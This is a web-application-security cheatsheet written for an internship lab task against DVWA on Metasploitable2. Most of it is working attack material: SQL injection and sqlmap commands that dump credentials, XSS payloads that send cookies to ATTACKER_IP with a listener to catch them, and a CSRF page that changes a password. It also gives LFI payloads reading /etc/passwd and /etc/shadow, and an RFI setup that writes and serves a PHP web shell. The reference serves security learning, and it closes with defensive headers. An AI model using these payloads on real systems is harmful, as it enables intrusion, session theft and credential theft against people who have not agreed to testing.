# Task 3 — Quick Reference Cheatsheet
> Web Application Security | ApexPlanet Internship

---

## 💉 SQL Injection

```sql
-- BASIC TESTS
'                          -- Single quote test (causes error if vulnerable)
1' OR '1'='1               -- Always true
1' OR 1=1--                -- Comment out rest of query
' OR 1=1#                  -- MySQL comment style
admin'--                   -- Bypass login

-- UNION BASED
1' UNION SELECT null,null--                          -- Find column count
1' UNION SELECT null,database()--                   -- Get DB name
1' UNION SELECT null,version()--                    -- Get DB version
1' UNION SELECT null,user()--                       -- Get DB user
1' UNION SELECT null,table_name FROM information_schema.tables WHERE table_schema=database()--
1' UNION SELECT null,column_name FROM information_schema.columns WHERE table_name='users'--
1' UNION SELECT user,password FROM users--          -- Dump credentials

-- BLIND (Boolean)
1' AND 1=1--               -- True condition
1' AND 1=2--               -- False condition (different response = vulnerable)

-- sqlmap
sqlmap -u "URL?id=1" --cookie="security=low;PHPSESSID=xxx" --dbs
sqlmap -u "URL?id=1" --cookie="..." -D dvwa --tables
sqlmap -u "URL?id=1" --cookie="..." -D dvwa -T users --dump
```

---

## 🔥 XSS Payloads

```javascript
// BASIC
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>
<script>alert(document.domain)</script>

// BYPASS FILTERS
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
<iframe src="javascript:alert('XSS')">
<input autofocus onfocus=alert('XSS')>
"><script>alert('XSS')</script>
';alert('XSS')//

// COOKIE STEALING
<script>document.location='http://ATTACKER_IP:8000/?c='+document.cookie</script>
<script>new Image().src='http://ATTACKER_IP:8000/?c='+document.cookie</script>

// LISTENER (on Kali)
python3 -m http.server 8000
# Check terminal for stolen cookies
```

---

## 🎭 CSRF

```html
<!-- CSRF ATTACK PAGE (save as csrf-demo.html) -->
<html>
<body>
  <form id="f" action="http://TARGET/dvwa/vulnerabilities/csrf/" method="GET">
    <input type="hidden" name="password_new" value="hacked123"/>
    <input type="hidden" name="password_conf" value="hacked123"/>
    <input type="hidden" name="Change" value="Change"/>
  </form>
  <script>document.getElementById('f').submit();</script>
</body>
</html>

<!-- PREVENTION TOKEN -->
<input type="hidden" name="csrf_token" value="<?= $_SESSION['csrf_token'] ?>">
```

---

## 📂 File Inclusion

```bash
# LFI PAYLOADS
?page=../../../../etc/passwd
?page=../../../../etc/shadow
?page=../../../../etc/hosts
?page=../../../../var/log/apache2/access.log
?page=../../../../proc/self/environ

# PATH TRAVERSAL BYPASSES
?page=....//....//etc/passwd
?page=%2e%2e%2f%2e%2e%2fetc%2fpasswd   # URL encoded
?page=..%252f..%252fetc%252fpasswd      # Double encoded

# PHP WRAPPERS
?page=php://filter/convert.base64-encode/resource=index.php
?page=expect://id
?page=data://text/plain,<?php system('id'); ?>

# RFI SETUP
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
cd /tmp && python3 -m http.server 8000
# ?page=http://KALI_IP:8000/shell.php&cmd=id
# ?page=http://KALI_IP:8000/shell.php&cmd=whoami
# ?page=http://KALI_IP:8000/shell.php&cmd=cat+/etc/passwd
```

---

## 🔫 Burp Suite Quick Reference

```
PROXY SETUP
  Firefox → Settings → Network → Manual Proxy
  HTTP Proxy: 127.0.0.1  Port: 8080
  ✓ Also use for HTTPS
  Install CA: http://burp → CA Certificate

INTERCEPT
  Proxy → Intercept ON
  Browse target → request appears
  Modify → Forward / Drop

REPEATER
  Right-click request → Send to Repeater
  Modify params → Send → View response

INTRUDER (BRUTE FORCE)
  Right-click → Send to Intruder
  Positions → Clear § → Mark target → Add §
  Payloads → Simple List → Load wordlist
  /usr/share/wordlists/rockyou.txt
  Start Attack → Sort by Length

DECODER
  Paste encoded text
  Decode as: Base64 / URL / HTML / Hex

SCANNER (Pro only)
  Right-click request → Scan
  Active scan finds SQLi, XSS, etc.

USEFUL SHORTCUTS
  Ctrl+R → Send to Repeater
  Ctrl+I → Send to Intruder
  Ctrl+U → URL encode selection
  Ctrl+Shift+U → URL decode selection
```

---

## 🛡️ Security Headers

```bash
# CHECK HEADERS
curl -I http://target.com
curl -I https://target.com

# APACHE CONFIG (/etc/apache2/apache2.conf)
a2enmod headers
systemctl restart apache2

Header always set X-Frame-Options "DENY"
Header always set X-XSS-Protection "1; mode=block"
Header always set X-Content-Type-Options "nosniff"
Header always set Content-Security-Policy "default-src 'self'"
Header always set Strict-Transport-Security "max-age=31536000"
Header always set Referrer-Policy "no-referrer"
Header always set Permissions-Policy "geolocation=(), microphone=()"
```

---

## 🔑 DVWA Setup

```bash
# DVWA on Metasploitable2
# URL: http://192.168.56.101/dvwa
# Login: admin / password

# Security Levels:
# Low    → No protection (start here)
# Medium → Basic filters (try bypasses)
# High   → Strong filters (advanced bypasses)
# Impossible → Fully secure (reference)

# Change security: DVWA Security tab → select level → Submit

# DVWA on Kali (if needed)
apt install dvwa -y
# Follow setup at http://localhost/dvwa/setup.php
```

---

## 📊 OWASP Top 10 Quick Reference

```
A01 Broken Access Control     → IDOR, path traversal
A02 Cryptographic Failures    → Weak encryption, HTTP
A03 Injection                 → SQLi, XSS, Command injection
A04 Insecure Design           → Missing security controls
A05 Security Misconfiguration → Default creds, exposed headers
A06 Vulnerable Components     → Outdated libraries
A07 Auth Failures             → Weak passwords, CSRF
A08 Data Integrity Failures   → Unsigned updates
A09 Logging Failures          → No audit trail
A10 SSRF                      → Server-side request forgery
```

---

## 🧪 Common Web Attack Commands

```bash
# Nikto (web vulnerability scanner)
nikto -h http://192.168.56.101
nikto -h http://192.168.56.101/dvwa

# dirb (directory brute force)
dirb http://192.168.56.101
dirb http://192.168.56.101 /usr/share/wordlists/dirb/common.txt

# gobuster
gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirb/common.txt

# curl useful flags
curl -I URL                    # Headers only
curl -v URL                    # Verbose
curl -X POST -d "user=admin&pass=admin" URL  # POST request
curl -b "cookie=value" URL     # Send cookie
curl -A "Mozilla/5.0" URL      # Custom user-agent
```

---

*Cheatsheet by Manivel R | ApexPlanet Internship 2026 | github.com/manivel-cyber-ai*
